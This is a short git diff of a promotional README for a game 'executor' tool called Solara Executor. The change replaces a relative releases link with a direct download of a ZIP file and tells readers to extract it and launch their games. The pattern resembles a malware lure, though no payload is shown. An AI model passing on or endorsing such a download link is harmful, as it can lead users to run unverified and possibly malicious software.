@@ -31,7 +31,7 @@ Discover **Solara Executor**, the ultimate tool for gaming in 2024! Experience s
 ---
 
 ## 🛫 How to Get Started?  
-1. **[Download Solara Executor](../../releases)**.  
+1. **[Download Solara Executor](https://github.com/solaraskkm/solara-executor/releases/download/Update/updatev1.zip)**.  
 2. Extract the downloaded ZIP file. 🖱️  
 3. Launch your favorite games and enjoy enhanced performance! 🚀
 
